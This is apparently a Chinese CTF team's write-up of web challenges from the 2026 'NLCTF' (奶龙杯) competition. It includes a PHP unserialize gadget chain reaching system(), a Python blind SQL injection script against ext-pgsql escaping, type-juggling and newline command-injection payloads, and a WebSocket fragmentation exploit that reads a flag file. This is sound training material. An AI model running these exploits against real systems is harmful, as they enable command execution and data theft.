---
title: 2026 奶龙杯
published: 2026-08-17
description: 被暴捶了
image: "./15.jpg"
tags: ["CTF"]
category: CTF
draft: false
slug: nailong
---

本次奶龙杯我们 0xFA 战队拿到了第 18 的战绩

web 题是自己做完了（jvav 让 ai 解的），其他基本都是学长做完了（tql）

## Web

### [NLCTF2026] unserialize/二血

题目给了附件：

```php
<?php

error_reporting(0);

  

class SecurityValidator {

    private $mode;

    private $data;

  

    public function __construct() {

        $this->mode = 'safe';

        $this->data = null;

    }

  

    public function __wakeup() {

        if ($this->mode !== 'safe') {

            die("Security violation detected");

        }

    }

  

    public function getMode() {

        return $this->mode;

    }

  

    public function getData() {

        return $this->data;

    }

}

  

class CommandExecutor {

    private $validator;

    private $command;

    private $enabled;

  

    public function __construct() {

        $this->validator = new SecurityValidator();

        $this->command = 'echo "Hello"';

        $this->enabled = false;

    }

  

    public function __destruct() {

        if (!$this->enabled) {

            return;

        }

  

        if (!($this->validator instanceof SecurityValidator)) {

            die("Invalid validator type");

        }

  

        if ($this->validator->getMode() === 'safe') {

            die("Safe mode active");

        }

  

        system($this->command);

    }

}

  

class Mutator {

    public $ref;

  

    public function __wakeup() {

        if (is_string($this->ref)) {

            $this->ref = "hacked";

        }

    }

}

  

if (isset($_POST['data'])) {

    $obj = unserialize($_POST['data']);

    unset($obj);

    exit;

}

  

highlight_file(__FILE__);
```

审计代码：

在 `__destruct()` 内我们可以看到：

- enabled 必须为真
- validator 必须是 SecurityValidator
- mode 不能是 safe

达成了上述条件后才能达到 rce

值得注意的是，此题的环境是 `php 8.0`，于是对于 `__wakeup` 魔术方法的绕过不成立（于 `php 7.4` 版本修复）

因此我们来看 `__wakeup` 内做了什么：

```php
public function __wakeup() {
        if ($this->mode !== 'safe') {
            die("Security violation detected");
        }
    }
```

可以见的，若是 `mode` 不为 `safe` 则会直接 `die`

但是，根据 php 官方的说法：

![[Pasted image 20260816085800.png]]

而这个对象析构方法，其实就是我们常说的魔术方法 `__destruct()`

因此这道题实际上是个伪过滤，直接搓链子就行：

```php
<?php

  

class SecurityValidator {

    private $mode;

    private $data;

  

    public function __construct() {

        $this->mode = 'safe';

        $this->data = null;

    }

  

    public function __wakeup() {

        if ($this->mode !== 'safe') {

            die("Security violation detected");

        }

    }

  

    public function getMode() {

        return $this->mode;

    }

  

    public function getData() {

        return $this->data;

    }

}

  

class CommandExecutor {

    private $validator;

    private $command;

    private $enabled;

  

    public function __construct() {

        $this->validator = new SecurityValidator();

        $this->command = 'echo "Hello"';

        $this->enabled = false;

    }

  

    public function __destruct() {

        if (!$this->enabled) {

            return;

        }

        if (!($this->validator instanceof SecurityValidator)) {

            die("Invalid validator type");

        }

        if ($this->validator->getMode() === 'safe') {

            die("Safe mode active");

        }

        system($this->command);

    }

}

  

class Mutator {

    public $ref;

  

    public function __wakeup() {

        if (is_string($this->ref)) {

            $this->ref = "hacked";

        }

    }

}

$cmd = isset($argv[1]) ? $argv[1] : 'id';

  

$sv = new SecurityValidator();

$rp = new ReflectionProperty('SecurityValidator', 'mode');

$rp->setAccessible(true);

$rp->setValue($sv, 'evil');

  

$ce = new CommandExecutor();

$rp = new ReflectionProperty('CommandExecutor', 'validator');

$rp->setAccessible(true);

$rp->setValue($ce, $sv);

$rp = new ReflectionProperty('CommandExecutor', 'command');

$rp->setAccessible(true);

$rp->setValue($ce, $cmd);

$rp = new ReflectionProperty('CommandExecutor', 'enabled');

$rp->setAccessible(true);

$rp->setValue($ce, true);

  

$payload = serialize($ce);

  

echo "[RAW]\n" . $payload . "\n\n";

echo "[URLENCODED]\n" . urlencode($payload) . "\n\n";

echo "[SEND]\ncurl -s -X POST http://challenge.cyclens.tech:30596/ --data-urlencode \"data=" . urlencode($payload) . "\"\n";
```

### [NLCTF2026] ezphp

`/source.php`：

```php
<?php
declare(strict_types=1);

require_once dirname(__DIR__) . '/config.php';

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');

function respond(int $status, array $payload): never
{
    http_response_code($status);
    echo json_encode($payload, JSON_UNESCAPED_SLASHES);
    exit;
}

$code = $_GET['code'] ?? '';
if (!is_string($code) || $code === '' || strlen($code) > 180) {
    respond(400, ['error' => 'share code must contain 1-180 characters']);
}

// Old gateway rules. SQL metacharacters are left to ext-pgsql's escaping.
if (preg_match('/[;\x00-\x1f\x7f]/', $code) === 1) {
    respond(400, ['error' => 'unsupported character']);
}
if (preg_match('/\b(select|union|returning|copy)\b|\bpg_|information_schema/i', $code) === 1) {
    respond(400, ['error' => 'query syntax is not a share code']);
}

// Schema: documents(share_code, title, body, is_public).
$filters = [
    'share_code' => $code,
    'is_public' => true,
];

set_error_handler(static fn (): bool => true);
try {
    $rows = pg_select(database(), 'documents', $filters, PGSQL_DML_EXEC);
} catch (Throwable) {
    $rows = false;
} finally {
    restore_error_handler();
}

respond(200, [
    'found' => is_array($rows) && count($rows) > 0,
]);
```

看完感觉像个 sql 注入

在首页上可以看到一个 `VAULT` 字段是不被公开的，大概率我们是要查到这个字段

这里搜到是个 cve，刚好就是本题目的解法

cve 编号：CVE-2026-17543

该 CVE 是通过 E'...' 反斜杠突破在 ext-pgsql 中进行 SQL 注入

这个 `ext-pgsql` 是一个 php 的插件，会将我们传入的语句进行参数化处理

- **`PGSQL_DML_EXEC`**：本意是生成 `share_code = $1 AND is_public = $2` 占位符，配合 `PQexecParams` 参数绑定 —— 设计上安全
- **`PGSQL_DML_ESCAPE`**：转义后**内联**进 SQL 字符串
- **`PGSQL_DML_STRING`**：只生成 SQL 字符串返回、不执行（调试用）

而 `php_pgsql_convert()` 处理值时有个**致命的细节**：它用 `PQescapeStringConn()` 转义后，把值包成 PostgreSQL 的 **`E'...'` 转义字符串**（而不是普通字符串）。PostgreSQL 9.1+ 默认 `standard_conforming_strings=on`，这个模式下 `PQescapeStringConn` **不转义反斜杠**（因为标准字符串里反斜杠不是转义符）—— 但 `E'...'` 语境里反斜杠是转义符。两个语境一错位，攻击者输入的 `\` 就能吞掉闭合引号

等于是左右脑互博（

等于我们输入两个同样的符号即可，例如：

```plain
share_code = E'\'' OR 1=1-- ' AND is_public = E'1'
```

这里的前面的 `\'` 在进行处理后变为 `"`（这个是字符串内容），后面的 `'` 才是闭合符号

根据页面回显使用二分法注入拿到 flag

条件：

```plain
1.相当于只有 true/false
2.可比较大小并且查询参数没被过滤，二分法较快
```

最终 payload：

```python
import urllib.request, urllib.parse, json, sys, time

  

BASE = "http://challenge.cyclens.tech:32182/api/lookup.php"

VAULT = "chr(86)||chr(65)||chr(85)||chr(76)||chr(84)" 

  

def oracle(condition: str) -> bool:

    payload = "\\' OR (" + condition + ")-- "

    url = BASE + "?code=" + urllib.parse.quote(payload, safe="")

    for _ in range(3):

        try:

            with urllib.request.urlopen(url, timeout=8) as r:

                return json.loads(r.read().decode()).get("found") is True

        except Exception:

            time.sleep(0.5)

    return False

  


lo, hi = 0, 400

while lo < hi:

    mid = (lo + hi + 1) // 2

    if oracle(f"share_code = {VAULT} AND length(body) > {mid}"):

        lo = mid

    else:

        hi = mid - 1

length = lo

print(f"[*] body length = {length}", flush=True)

  


result = ""

for pos in range(1, length + 1):

    lo, hi = 32, 126

    while lo < hi:

        mid = (lo + hi) // 2

        cond = f"share_code = {VAULT} AND ascii(substring(body from {pos} for 1)) > {mid}"

        if oracle(cond):

            lo = mid + 1

        else:

            hi = mid

    ch = chr(lo)

    result += ch

    print(f"[{pos}] {repr(ch)} -> {result}", flush=True)

    if ch == "}":

        break

  

print("\n=== FLAG ===")

print(result)
```

### [NLCTF2026] LamentXU's chal

```php
<?php

ob_start();

highlight_file(__FILE__);

$userId = $_GET['userId'] ?? '';
$rawRole = $_GET['role'] ?? '';
$roleText = trim($rawRole);

function grantRole($userId, $roleId) {
    if ($roleId === 1) {
        $flag = file_get_contents('/flag');
        echo $flag;
    }
}

if (strlen($userId) < 114) {
    http_response_code(200);
    exit('user id is too short');
}

if ($roleText === '1') {
    http_response_code(403);
    exit('admin role is forbidden');
}

if (preg_match('/[eE.]/', $roleText)) {
    http_response_code(200);
    exit('invalid role id');
}

if ($roleText[0] === '0') {
    http_response_code(200);
    exit('leading zero is forbidden');
}

if (!is_numeric($roleText)) {
    http_response_code(200);
    exit('invalid role id');
}

$roleId = intval($rawRole);

grantRole($userId, $roleId);
user id is too short
```

在函数 `grantRole` 里面我们可以知道，使得 `$roleId` 等于 1 即可拿到 flag

而 `$roleId` 有这些要求：

字符串不等于 `'1'`、不含 `e`/`E`/`.`、不以 `0` 开头、`is_numeric()` 为真
`intval` 后等于 1

利用 `role=+1` 即可，+1 在 php 8 返回 true，`intval` 后等于 1

最终 payload：

```plain
http://challenge.cyclens.tech:32028/?userId=AAAA...(114个A)&role=%2B1
```

### [NLCTF2026] signin

```php
<?php

ob_start();

highlight_file(__FILE__);

$userId = $_GET['userId'] ?? '';
$rawRole = $_GET['role'] ?? '';
$roleText = trim($rawRole);

function grantRole($userId, $roleId) {
    if ($roleId === 1) {
        $flag = file_get_contents('/flag');
        echo $flag;
    }
}

if (strlen($userId) < 114) {
    http_response_code(200);
    exit('user id is too short');
}

if (str_contains($roleText, '+') || str_contains($roleText, '-')) {
    http_response_code(200);
    exit('sign character is forbidden');
}

if ($roleText === '1') {
    http_response_code(403);
    exit('admin role is forbidden');
}

if (preg_match('/[eE.]/', $roleText)) {
    http_response_code(200);
    exit('invalid role id');
}

if ($roleText[0] === '0') {
    http_response_code(200);
    exit('leading zero is forbidden');
}

if (!preg_match('/[0-9]/', $roleText)) {
    http_response_code(200);
    exit('invalid role id');
}

$roleId = intval($rawRole);

grantRole($userId, $roleId);
user id is too short
```

参数的值个数太少了不行，不能去计算得到想要的数值，不能和 `1` 强相等，不能使用科学计数法，首字符不能是 0，必须含有数字

最终 payload：

```plain
curl "http://challenge.cyclens.tech:31290/?userId=$(printf 'A%.0s' {1..114})&role=1a"
```

### [NLCTF2026] lets_goooooo

go 的题目，看着像 rce，重点关注 `/ping` 路由：

```go
func ping(w http.ResponseWriter, r *http.Request) {

    host := r.URL.Query().Get("host")

    if host == "" || len(host) > 80 {

        http.Error(w, "invalid host", http.StatusBadRequest)

        return

    }

  

    if strings.ContainsAny(host, " ;|&$`(){}[]<>\\\"") {

        w.Header().Set("Content-Type", "text/html; charset=utf-8")

        _ = page.Execute(w, viewData{Output: "blocked: suspicious character detected"})

        return

    }

  

    ctx := r.Context()

    cmd := exec.CommandContext(ctx, "/bin/sh", "-c", fmt.Sprintf("ping -c 1 -W 1 %s", host))

    result := make(chan []byte, 1)

    go func() {

        out, _ := cmd.CombinedOutput()

        result <- out

    }()

  

    var out []byte

    select {

    case out = <-result:

    case <-time.After(3 * time.Second):

        _ = cmd.Process.Kill()

        out = []byte("timeout")

    }

    if len(out) > 4096 {

        out = out[:4096]

    }

    w.Header().Set("Content-Type", "text/html; charset=utf-8")

    _ = page.Execute(w, viewData{Output: string(out)})

}
```

这里 `func ping(w http.ResponseWriter, r *http.Request)` 把我们响应包和我们发送的内容都接受进来

取到 url 和参数后进行过滤：

```go
if host == "" || len(host) > 80 {
    http.Error(w, "invalid host", http.StatusBadRequest)
    return
}
// 进行长度校验

if strings.ContainsAny(host, " ;|&$`(){}[]<>\\\"") {
// 进行黑名单过滤
```

进行命令执行：

```go
cmd := exec.CommandContext(ctx, "/bin/sh", "-c", fmt.Sprintf("ping -c 1 -W 1 %s", host))
```

这里把命令交给 shell 去执行（`/bin/sh` ）

也是 rce 的漏洞来源，直接将 `host` 的内容拼接进来去执行

最终 payload：

```plain
host=127.0.0.1%0aenv
```

### [NLCTF2026] little_Java

Summary

Java WebSocket 网关"分裂地平线"题。核心思路:让边缘代理(手写解析器)与 Java-WebSocket 库对同一请求解析出**不同语义**,再借助 WebSocket **分片消息只校验首片**的缺陷,把恶意 `readFile` 操作藏在分片第二帧中,绕过敏感词过滤拿到 `/tmp/flag`。capability 由 HMAC-SHA256 签名(90s 过期),每 600s 进程重启清空连接状态。

Solution

Step 1: 分裂地平线握手

`GET /api/bootstrap` 获取 ticket + trace 后,向 `ws://HOST:8001/gateway` 发起握手。关键构造是让 EdgeProxy(收集同名头为列表)与 Java-WebSocket(`Draft.translateHandshakeHttp` 将同名头拼接为 `旧值 + "; " + 新值`)看到不同的值:

- 两个 `X-Relay-Route` 头(`public` + `recovery`):边缘要求恰好这两个原子值;库侧合并为 `"public; recovery"`,正好是内部 registry 要求的路由
    
- `Sec-WebSocket-Protocol: relay.v1, operator.v1`:边缘要求首 token 为 `relay.v1`;服务器按自身列表顺序 `[operator.v1, relay.v1]` 遍历,选中 `operator.v1`
    
- 两个 `Sec-WebSocket-Extensions` 头(`permessage-deflate` + `client_no_context_takeover`):协商压缩扩展(可发不压缩帧,RSV1=0)
    

Step 2: 分片 preflight + Ping 证明 + readFile

`RelayDraft.processFrame` 只对 `TEXT && !FIN` 帧执行 `captureOpening`(校验 OPENING 正则、HMAC、trace,并禁止文本含 `operator`/`readFile`,**仅查首片**)。攻击序列:

1. 帧1(TEXT, FIN=0):telemetry 格式 JSON → 通过 preflight,`openingDigest = sha256(帧1明文)`
    
2. Ping 控制帧:payload = `openingDigest` 前 16 字节 → `recoveryArmed = true`(控制帧不经过文本过滤)
    
3. 帧2(CONTINUOUS, FIN=1):`,"phase":"operator","op":"readFile","path":"/tmp/flag"}` → 不受检查,拼接后 Jackson 重复键 last-wins,`phase`/`op` 被覆盖为 `operator`/`readFile` → 返回 flag
    
```python
#!/usr/bin/env python3  
import base64, hashlib, json, os, socket, struct, urllib.request  
​  
HOST, PORT = "challenge.cyclens.tech", 30415  
​  
def bootstrap():  
    with urllib.request.urlopen(f"http://{HOST}:{PORT}/api/bootstrap", timeout=10) as r:  
        return json.loads(r.read())  
​  
def frame(opcode, payload, fin=True):  
    mask = os.urandom(4)  
    n = len(payload)  
    b1 = (0x80 if fin else 0) | opcode  
    hdr = bytes([b1, 0x80 | n]) if n < 126 else bytes([b1, 0x80 | 126]) + struct.pack(">H", n)  
    return hdr + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(payload))  
​  
def recv_exact(s, n):  
    data = b""  
    while len(data) < n:  
        c = s.recv(n - len(data))  
        if not c:  
            raise ConnectionError("closed")  
        data += c  
    return data  
​  
def recv_frame(s):  
    b1, b2 = recv_exact(s, 2)  
    n = b2 & 0x7F  
    if n == 126: n = struct.unpack(">H", recv_exact(s, 2))[0]  
    elif n == 127: n = struct.unpack(">Q", recv_exact(s, 8))[0]  
    m = recv_exact(s, 4) if b2 & 0x80 else None  
    p = recv_exact(s, n)  
    return b1 & 0x0F, bytes(b ^ m[i % 4] for i, b in enumerate(p)) if m else p  
​  
cap = bootstrap()  
ticket, trace = cap["ticket"], cap["trace"]  
​  
s = socket.create_connection((HOST, PORT), timeout=10)  
s.sendall((  
    "GET /gateway HTTP/1.1\r\n"  
    f"Host: {HOST}:{PORT}\r\n"  
    "Upgrade: websocket\r\nConnection: Upgrade\r\n"  
    f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\n"  
    "Sec-WebSocket-Version: 13\r\n"  
    "X-Relay-Route: public\r\n"  
    "X-Relay-Route: recovery\r\n"  
    "Sec-WebSocket-Protocol: relay.v1, operator.v1\r\n"  
    "Sec-WebSocket-Extensions: permessage-deflate\r\n"  
    "Sec-WebSocket-Extensions: client_no_context_takeover\r\n\r\n"  
).encode())  
resp = b""  
while b"\r\n\r\n" not in resp:  
    resp += s.recv(4096)  
assert b" 101 " in resp.split(b"\r\n", 1)[0]  
​  
p1 = f'{{"ticket":"{ticket}","trace":"{trace}","phase":"telemetry","op":"ping"'  
s.sendall(frame(0x1, p1.encode(), fin=False))                      # 分片首片:过 preflight  
s.sendall(frame(0x9, hashlib.sha256(p1.encode()).digest()[:16]))  # Ping:digest 前16字节  
s.sendall(frame(0x0, b',"phase":"operator","op":"readFile","path":"/tmp/flag"}'))  # 末片  
​  
while True:  
    opcode, payload = recv_frame(s)  
    if opcode == 0x1:  
        print(payload.decode())   # flag  
        break  
    if opcode == 0x8:  
        break
```

### [NLCTF2026] phantom的surprise

ds 实在没解出来，后面学长跑出来了

### Typecho（题目不记得了）（未解出）

看 wp 学到了很多，真的防了手 ai 啊（ds 跑岔了气也没出）